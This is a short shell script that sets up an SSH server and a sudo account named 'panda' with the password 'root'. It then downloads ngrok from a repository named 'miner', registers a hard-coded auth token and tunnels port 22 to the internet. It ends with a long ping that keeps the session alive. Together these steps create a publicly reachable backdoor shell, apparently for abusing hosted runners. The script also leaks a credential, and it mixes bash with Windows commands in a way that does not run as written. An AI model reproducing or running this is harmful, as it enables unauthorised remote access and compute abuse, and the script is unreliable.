sudo apt-get update -y
sudo apt install openssh-server -y
sudo apt install ufw -y
sudo ufw allow ssh
adduser --disabled-password --gecos "" panda
adduser panda sudo
echo 'panda:root' | chpasswd
sudo /etc/init.d/ssh start
wget https://github.com/p4n1k/miner/releases/download/ngrok/ngrok
chmod +x ngrok
./ngrok authtoken 22vD0A9L00nyb2sPamKdgaVcGsG_77prNN7CATVXBWkd4DaRm >a.ps1
./ngrok tcp 22 >>a.ps1
ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
